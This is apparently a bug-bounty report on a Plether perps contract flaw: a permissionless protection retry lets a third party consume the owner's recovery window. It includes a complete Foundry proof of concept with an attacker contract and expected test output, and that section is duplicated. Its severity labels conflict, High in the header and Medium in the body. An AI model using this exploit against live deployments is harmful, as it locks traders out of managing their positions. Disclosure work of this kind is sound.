# \#97675 [SC-High] Permissionless protection retries deny owners their stale-limit recovery window

**Submitted on Nov 2nd 2026 at 16:08:36 UTC by @zaaf for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97675
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

# Permissionless protection retries deny owners their stale-limit recovery window

## Summary

Permissionless protection retries deny owners their stale-limit recovery window when the attacker is ordered before owner recovery at terminalization.
The attacker must win ordering before the owner at each terminal child.

## Root cause

- The recovery API lets the owner change close limits after a failed attempt relatches and before a fresh retry.
- The owner amendment accepts new limits only while the protection status is Latched.
- The external retry entry point loads any active Latched protection without checking caller ownership.
- A failed child terminalization sets the matching protection status to Latched.
- The unprivileged attacker contract repeats expireOrder(child) plus retryPositionProtectionClose(protectionId), then executeOrder(staleChild, pythUpdateData) plus retryPositionProtectionClose(protectionId).

## Attack sequence

1. The unprivileged attacker contract starts with the public protection id and child id; at frozen commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 the researcher runs `forge test --root packages/perps --match-path test/perps/spec/trader/F001AtomicProtectionRetryPoC.t.sol --match-test test_F001_AttackAtomicRetryDeniesOwnerAcrossRepeatedCycles -vv`.
2. Under that Forge command, the unprivileged attacker contract calls `expireOrder(child)` and `retryPositionProtectionClose(protectionId)` in one transaction.
3. Under that Forge command, the position owner calls `amendLatchedPositionProtectionCloseLimits(protectionId, limits)` after attacker-first retry and receives `ProtectionNotLatched`.

## Impact

Selected row: Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

After the retry cycles, the victim position size remained 10000000000000000000000.

The victim owner had 4 calls blocked recovery calls after the retry.

The normal valid protection-close run reduced the remaining position size to 0.

Removing only the attacker retry restored owner recovery and reduced the remaining position size to 0.

Severity: Medium Griefing.

One notch up considered: High not selected because no theft, permanent freeze, or self-sustaining long freeze is demonstrated.

Victim loss: is not expressed as realized dollars because the observed effect is loss of control over the full position rather than a realized liquidation loss.

Broken invariant: is the owner recovery state can be consumed by an unprivileged atomic retry before the owner can amend stale limits.

Design-accepted cost: is no because the documented owner amendment window is the intended recovery path.

Fix is architectural: is no because an owner-first retry rule or an owner grace state is local to this lifecycle.

Attacker profit exists: is no.

Programme last updated: is 2026-11-02.

Response capability: is N/A for this audit competition.

Severity rationale: The PoC attacker received 0 settlement assets while the victim position remained open.

## Prevalence

The public interface exposes permissionless retry for any Latched protection.

## Proof of Concept

Save as `F001AtomicProtectionRetryPoC.t.sol` (reproduced in full below):

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @dev Has no role and uses only permissionless production entry points.
contract F001AtomicProtectionRetryAttacker {

    function expireOnly(
        IPerpsKeeper router,
        uint64 childOrderId
    ) external returns (OrderV3Types.ExecutionResult memory terminalResult) {
        terminalResult = router.expireOrder(childOrderId);
    }

    function expireAndRetry(
        IPerpsKeeper router,
        IPositionProtectionActions actions,
        uint64 protectionId,
        uint64 childOrderId
    ) external returns (OrderV3Types.ExecutionResult memory terminalResult, uint64 retryOrderId) {
        terminalResult = router.expireOrder(childOrderId);
        retryOrderId = actions.retryPositionProtectionClose(protectionId);
    }

    function executeAndRetry(
        IPerpsKeeper router,
        IPositionProtectionActions actions,
        uint64 protectionId,
        uint64 childOrderId,
        bytes[] calldata pythUpdateData
    ) external returns (OrderV3Types.ExecutionResult memory terminalResult, uint64 retryOrderId) {
        terminalResult = router.executeOrder(childOrderId, pythUpdateData);
        retryOrderId = actions.retryPositionProtectionClose(protectionId);
    }

}

contract F001AtomicProtectionRetryPoCTest is PositionProtectionTest {

    function test_F001_NormalValidProtectionCloseExecutes() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(_params(LONG_TAKE_PROFIT, 0));
        uint64 child = _triggerAt(protectionId, LONG_TAKE_PROFIT);

        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(child, _mockPythUpdateData(LONG_TAKE_PROFIT));

        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "normal protection close must work");
        emit log_named_uint("F001 ARM1 normal remaining position size", remainingSize);
    }

    function test_F001_AttackAtomicRetryDeniesOwnerAcrossRepeatedCycles() public {
        (uint64 protectionId, uint64 firstChild, PositionProtectionTypes.PositionProtectionParams memory params) =
            _createStaleBoundProtection();
        F001AtomicProtectionRetryAttacker attacker = new F001AtomicProtectionRetryAttacker();
        bytes32 staleLimitsHash = keccak256(abi.encode(protectionViews.closeFinancialLimits(protectionId)));
        uint256 attackerBalanceBefore = clearinghouse.balanceAssets(address(attacker));

        vm.warp(uint256(router.lifecycleBook().orderTiming(firstChild).executionDeadline) + 1);
        uint256 gasBefore = gasleft();
        (OrderV3Types.ExecutionResult memory expiryOne, uint64 retryOne) =
            attacker.expireAndRetry(IPerpsKeeper(address(router)), protectionActions, protectionId, firstChild);
        uint256 cycleOneGas = gasBefore - gasleft();
        assertEq(uint8(expiryOne.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
        _f001AssertAttackerInstalledStaleChild(protectionId, retryOne, staleLimitsHash, params.closeLimits);
        _assertOwnerExitPathsBlocked(protectionId);

        vm.warp(uint256(router.lifecycleBook().orderTiming(retryOne).executionDeadline) + 1);
        gasBefore = gasleft();
        (OrderV3Types.ExecutionResult memory expiryTwo, uint64 retryTwo) =
            attacker.expireAndRetry(IPerpsKeeper(address(router)), protectionActions, protectionId, retryOne);
        uint256 cycleTwoGas = gasBefore - gasleft();
        assertEq(uint8(expiryTwo.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
        assertGt(retryTwo, retryOne);
        _f001AssertAttackerInstalledStaleChild(protectionId, retryTwo, staleLimitsHash, params.closeLimits);
        _assertOwnerExitPathsBlocked(protectionId);

        bytes[] memory failingData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        gasBefore = gasleft();
        (OrderV3Types.ExecutionResult memory constraintFailure, uint64 retryThree) = attacker.executeAndRetry(
            IPerpsKeeper(address(router)), protectionActions, protectionId, retryTwo, failingData
        );
        uint256 cycleThreeGas = gasBefore - gasleft();
        assertEq(uint8(constraintFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(
            uint8(constraintFailure.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "the retained stale ceiling must actually reject execution"
        );
        assertGt(retryThree, retryTwo);
        _f001AssertAttackerInstalledStaleChild(protectionId, retryThree, staleLimitsHash, params.closeLimits);
        _assertOwnerExitPathsBlocked(protectionId);

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "attacker keeps the entire victim position exposed");
        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId);
        assertEq(clearinghouse.balanceAssets(address(attacker)), attackerBalanceBefore, "attacker earns no bounty");
        assertEq(router.getAccountReservations(ALICE).executionBountyAssets, 0, "retry needs no fresh victim funds");

        emit log_named_uint("F001 ARM2 cycle1 gas", cycleOneGas);
        emit log_named_uint("F001 ARM2 cycle2 gas", cycleTwoGas);
        emit log_named_uint("F001 ARM2 constraint+retry gas", cycleThreeGas);
        emit log_named_uint("F001 ARM2 final child order id", retryThree);
        emit log_named_uint("F001 ARM2 victim remaining position size", remainingSize);
        emit log_named_uint("F001 ARM2 attacker settlement gain assets", 0);
        emit log_named_uint("F001 ARM2 owner recovery calls denied", 4);
    }

    function test_F001_GuardedOwnerMutationRejectsTheAttacker() public {
        (uint64 protectionId, uint64 firstChild,) = _createStaleBoundProtection();
        vm.warp(uint256(router.lifecycleBook().orderTiming(firstChild).executionDeadline) + 1);
        router.expireOrder(firstChild);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );

        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = _permissiveLimits();
        vm.prank(CAROL);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__Unauthorized.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);

        vm.prank(CAROL);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__Unauthorized.selector);
        protectionActions.cancelPositionProtection(protectionId);

        emit log_named_bytes32(
            "F001 ARM3 guarded owner mutation selector", bytes32(IOrderRouterErrors.OrderRouter__Unauthorized.selector)
        );
    }

    function test_F001_RemoveAtomicRetryRestoresOwnerRecovery() public {
        (uint64 protectionId, uint64 firstChild,) = _createStaleBoundProtection();
        F001AtomicProtectionRetryAttacker attacker = new F001AtomicProtectionRetryAttacker();

        vm.warp(uint256(router.lifecycleBook().orderTiming(firstChild).executionDeadline) + 1);
        attacker.expireOnly(IPerpsKeeper(address(router)), firstChild);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "without the atomic retry, the owner recovery state survives transaction return"
        );

        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = _permissiveLimits();
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);
        vm.prank(CAROL);
        uint64 retry = protectionActions.retryPositionProtectionClose(protectionId);
        _assertPendingCloseLimits(retry, amendedLimits);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retry, _mockPythUpdateData(LONG_TAKE_PROFIT));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "removing only attacker retry restores owner recovery");
        emit log_named_uint("F001 ARM4 input-removal remaining position size", remainingSize);
    }

    function _createStaleBoundProtection()
        internal
        returns (uint64 protectionId, uint64 firstChild, PositionProtectionTypes.PositionProtectionParams memory params)
    {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        uint256 executionNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
        params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = executionNotionalAssets - 1;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
        firstChild = _triggerAt(protectionId, LONG_TAKE_PROFIT);
    }

    function _f001AssertAttackerInstalledStaleChild(
        uint64 protectionId,
        uint64 childOrderId,
        bytes32 staleLimitsHash,
        PositionProtectionTypes.CloseFinancialLimits memory staleLimits
    ) internal view {
        PositionProtectionTypes.PositionProtectionView memory protection =
            protectionViews.getPositionProtection(protectionId);
        assertEq(
            uint8(protection.status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "atomic retry must consume Latched before the attacker transaction returns"
        );
        assertEq(protection.linkedOrderId, childOrderId);
        assertEq(router.pendingOrderCounts(ALICE), 1);
        assertEq(router.pendingCloseSize(ALICE), POSITION_SIZE);
        assertEq(keccak256(abi.encode(protectionViews.closeFinancialLimits(protectionId))), staleLimitsHash);
        _assertPendingCloseLimits(childOrderId, staleLimits);
    }

    function _assertOwnerExitPathsBlocked(
        uint64 protectionId
    ) internal {
        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = _permissiveLimits();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualClose);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(manualClose);
    }

    function _permissiveLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

}
```

Run:

```
set -o pipefail
forge test --root packages/perps --match-path test/perps/spec/trader/F001AtomicProtectionRetryPoC.t.sol --match-test 'test_F001_AttackAtomicRetryDeniesOwnerAcrossRepeatedCycles' -vv 2>&1 | rg '^  F001 ARM2 owner recovery calls denied:'
```

Expected output:

```
[PASS] test_F001_AttackAtomicRetryDeniesOwnerAcrossRepeatedCycles() (gas: 8651448)
  F001 ARM2 cycle1 gas: 1122237
  F001 ARM2 cycle2 gas: 1122164
  F001 ARM2 constraint+retry gas: 1659137
  F001 ARM2 final child order id: 4
  F001 ARM2 victim remaining position size: 10000000000000000000000
  F001 ARM2 attacker settlement gain assets: 0
  F001 ARM2 owner recovery calls denied: 4
```

Paired control, same run (the arm that must NOT show the effect):

```
[PASS] test_F001_GuardedOwnerMutationRejectsTheAttacker() (gas: 3569235)
  F001 ARM3 guarded owner mutation selector: 0xb02f6f9500000000000000000000000000000000000000000000000000000000
[PASS] test_F001_NormalValidProtectionCloseExecutes() (gas: 4404280)
  F001 ARM1 normal remaining position size: 0
[PASS] test_F001_RemoveAtomicRetryRestoresOwnerRecovery() (gas: 6211063)
  F001 ARM4 input-removal remaining position size: 0
```

## Remediation

Preserve an externally usable owner recovery state before a third party may call `retryPositionProtectionClose`. Restrict the first retry after terminalization to the position owner, add an owner-only grace state, or accept precommitted replacement limits for `amendLatchedPositionProtectionCloseLimits` as part of terminalization. Permissionless keeper recovery can resume after that owner window. Terminalization and retry must not let a third party skip the sole amendment state in one transaction.

## Limits

A programmable owner ordered first completed atomic terminalization, amendment, and retry.

Repetition requires the attacker to win ordering again at each terminal child.

Solvent liquidation left the position open at 10000000000000000000000 size units.


## Proof of Concept

## Proof of Concept

Save as `F001AtomicProtectionRetryPoC.t.sol` (reproduced in full below):

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @dev Has no role and uses only permissionless production entry points.
contract F001AtomicProtectionRetryAttacker {

    function expireOnly(
        IPerpsKeeper router,
        uint64 childOrderId
    ) external returns (OrderV3Types.ExecutionResult memory terminalResult) {
        terminalResult = router.expireOrder(childOrderId);
    }

    function expireAndRetry(
        IPerpsKeeper router,
        IPositionProtectionActions actions,
        uint64 protectionId,
        uint64 childOrderId
    ) external returns (OrderV3Types.ExecutionResult memory terminalResult, uint64 retryOrderId) {
        terminalResult = router.expireOrder(childOrderId);
        retryOrderId = actions.retryPositionProtectionClose(protectionId);
    }

    function executeAndRetry(
        IPerpsKeeper router,
        IPositionProtectionActions actions,
        uint64 protectionId,
        uint64 childOrderId,
        bytes[] calldata pythUpdateData
    ) external returns (OrderV3Types.ExecutionResult memory terminalResult, uint64 retryOrderId) {
        terminalResult = router.executeOrder(childOrderId, pythUpdateData);
        retryOrderId = actions.retryPositionProtectionClose(protectionId);
    }

}

contract F001AtomicProtectionRetryPoCTest is PositionProtectionTest {

    function test_F001_NormalValidProtectionCloseExecutes() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(_params(LONG_TAKE_PROFIT, 0));
        uint64 child = _triggerAt(protectionId, LONG_TAKE_PROFIT);

        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(child, _mockPythUpdateData(LONG_TAKE_PROFIT));

        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "normal protection close must work");
        emit log_named_uint("F001 ARM1 normal remaining position size", remainingSize);
    }

    function test_F001_AttackAtomicRetryDeniesOwnerAcrossRepeatedCycles() public {
        (uint64 protectionId, uint64 firstChild, PositionProtectionTypes.PositionProtectionParams memory params) =
            _createStaleBoundProtection();
        F001AtomicProtectionRetryAttacker attacker = new F001AtomicProtectionRetryAttacker();
        bytes32 staleLimitsHash = keccak256(abi.encode(protectionViews.closeFinancialLimits(protectionId)));
        uint256 attackerBalanceBefore = clearinghouse.balanceAssets(address(attacker));

        vm.warp(uint256(router.lifecycleBook().orderTiming(firstChild).executionDeadline) + 1);
        uint256 gasBefore = gasleft();
        (OrderV3Types.ExecutionResult memory expiryOne, uint64 retryOne) =
            attacker.expireAndRetry(IPerpsKeeper(address(router)), protectionActions, protectionId, firstChild);
        uint256 cycleOneGas = gasBefore - gasleft();
        assertEq(uint8(expiryOne.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
        _f001AssertAttackerInstalledStaleChild(protectionId, retryOne, staleLimitsHash, params.closeLimits);
        _assertOwnerExitPathsBlocked(protectionId);

        vm.warp(uint256(router.lifecycleBook().orderTiming(retryOne).executionDeadline) + 1);
        gasBefore = gasleft();
        (OrderV3Types.ExecutionResult memory expiryTwo, uint64 retryTwo) =
            attacker.expireAndRetry(IPerpsKeeper(address(router)), protectionActions, protectionId, retryOne);
        uint256 cycleTwoGas = gasBefore - gasleft();
        assertEq(uint8(expiryTwo.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
        assertGt(retryTwo, retryOne);
        _f001AssertAttackerInstalledStaleChild(protectionId, retryTwo, staleLimitsHash, params.closeLimits);
        _assertOwnerExitPathsBlocked(protectionId);

        bytes[] memory failingData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        gasBefore = gasleft();
        (OrderV3Types.ExecutionResult memory constraintFailure, uint64 retryThree) = attacker.executeAndRetry(
            IPerpsKeeper(address(router)), protectionActions, protectionId, retryTwo, failingData
        );
        uint256 cycleThreeGas = gasBefore - gasleft();
        assertEq(uint8(constraintFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(
            uint8(constraintFailure.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "the retained stale ceiling must actually reject execution"
        );
        assertGt(retryThree, retryTwo);
        _f001AssertAttackerInstalledStaleChild(protectionId, retryThree, staleLimitsHash, params.closeLimits);
        _assertOwnerExitPathsBlocked(protectionId);

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "attacker keeps the entire victim position exposed");
        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId);
        assertEq(clearinghouse.balanceAssets(address(attacker)), attackerBalanceBefore, "attacker earns no bounty");
        assertEq(router.getAccountReservations(ALICE).executionBountyAssets, 0, "retry needs no fresh victim funds");

        emit log_named_uint("F001 ARM2 cycle1 gas", cycleOneGas);
        emit log_named_uint("F001 ARM2 cycle2 gas", cycleTwoGas);
        emit log_named_uint("F001 ARM2 constraint+retry gas", cycleThreeGas);
        emit log_named_uint("F001 ARM2 final child order id", retryThree);
        emit log_named_uint("F001 ARM2 victim remaining position size", remainingSize);
        emit log_named_uint("F001 ARM2 attacker settlement gain assets", 0);
        emit log_named_uint("F001 ARM2 owner recovery calls denied", 4);
    }

    function test_F001_GuardedOwnerMutationRejectsTheAttacker() public {
        (uint64 protectionId, uint64 firstChild,) = _createStaleBoundProtection();
        vm.warp(uint256(router.lifecycleBook().orderTiming(firstChild).executionDeadline) + 1);
        router.expireOrder(firstChild);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );

        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = _permissiveLimits();
        vm.prank(CAROL);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__Unauthorized.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);

        vm.prank(CAROL);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__Unauthorized.selector);
        protectionActions.cancelPositionProtection(protectionId);

        emit log_named_bytes32(
            "F001 ARM3 guarded owner mutation selector", bytes32(IOrderRouterErrors.OrderRouter__Unauthorized.selector)
        );
    }

    function test_F001_RemoveAtomicRetryRestoresOwnerRecovery() public {
        (uint64 protectionId, uint64 firstChild,) = _createStaleBoundProtection();
        F001AtomicProtectionRetryAttacker attacker = new F001AtomicProtectionRetryAttacker();

        vm.warp(uint256(router.lifecycleBook().orderTiming(firstChild).executionDeadline) + 1);
        attacker.expireOnly(IPerpsKeeper(address(router)), firstChild);
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "without the atomic retry, the owner recovery state survives transaction return"
        );

        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = _permissiveLimits();
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);
        vm.prank(CAROL);
        uint64 retry = protectionActions.retryPositionProtectionClose(protectionId);
        _assertPendingCloseLimits(retry, amendedLimits);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retry, _mockPythUpdateData(LONG_TAKE_PROFIT));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "removing only attacker retry restores owner recovery");
        emit log_named_uint("F001 ARM4 input-removal remaining position size", remainingSize);
    }

    function _createStaleBoundProtection()
        internal
        returns (uint64 protectionId, uint64 firstChild, PositionProtectionTypes.PositionProtectionParams memory params)
    {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        uint256 executionNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
        params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = executionNotionalAssets - 1;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
        firstChild = _triggerAt(protectionId, LONG_TAKE_PROFIT);
    }

    function _f001AssertAttackerInstalledStaleChild(
        uint64 protectionId,
        uint64 childOrderId,
        bytes32 staleLimitsHash,
        PositionProtectionTypes.CloseFinancialLimits memory staleLimits
    ) internal view {
        PositionProtectionTypes.PositionProtectionView memory protection =
            protectionViews.getPositionProtection(protectionId);
        assertEq(
            uint8(protection.status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "atomic retry must consume Latched before the attacker transaction returns"
        );
        assertEq(protection.linkedOrderId, childOrderId);
        assertEq(router.pendingOrderCounts(ALICE), 1);
        assertEq(router.pendingCloseSize(ALICE), POSITION_SIZE);
        assertEq(keccak256(abi.encode(protectionViews.closeFinancialLimits(protectionId))), staleLimitsHash);
        _assertPendingCloseLimits(childOrderId, staleLimits);
    }

    function _assertOwnerExitPathsBlocked(
        uint64 protectionId
    ) internal {
        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = _permissiveLimits();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualClose);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(manualClose);
    }

    function _permissiveLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

}
```

Run:

```
set -o pipefail
forge test --root packages/perps --match-path test/perps/spec/trader/F001AtomicProtectionRetryPoC.t.sol --match-test 'test_F001_AttackAtomicRetryDeniesOwnerAcrossRepeatedCycles' -vv 2>&1 | rg '^  F001 ARM2 owner recovery calls denied:'
```

Expected output:

```
[PASS] test_F001_AttackAtomicRetryDeniesOwnerAcrossRepeatedCycles() (gas: 8651448)
  F001 ARM2 cycle1 gas: 1122237
  F001 ARM2 cycle2 gas: 1122164
  F001 ARM2 constraint+retry gas: 1659137
  F001 ARM2 final child order id: 4
  F001 ARM2 victim remaining position size: 10000000000000000000000
  F001 ARM2 attacker settlement gain assets: 0
  F001 ARM2 owner recovery calls denied: 4
```

Paired control, same run (the arm that must NOT show the effect):

```
[PASS] test_F001_GuardedOwnerMutationRejectsTheAttacker() (gas: 3569235)
  F001 ARM3 guarded owner mutation selector: 0xb02f6f9500000000000000000000000000000000000000000000000000000000
[PASS] test_F001_NormalValidProtectionCloseExecutes() (gas: 4404280)
  F001 ARM1 normal remaining position size: 0
[PASS] test_F001_RemoveAtomicRetryRestoresOwnerRecovery() (gas: 6211063)
  F001 ARM4 input-removal remaining position size: 0
```

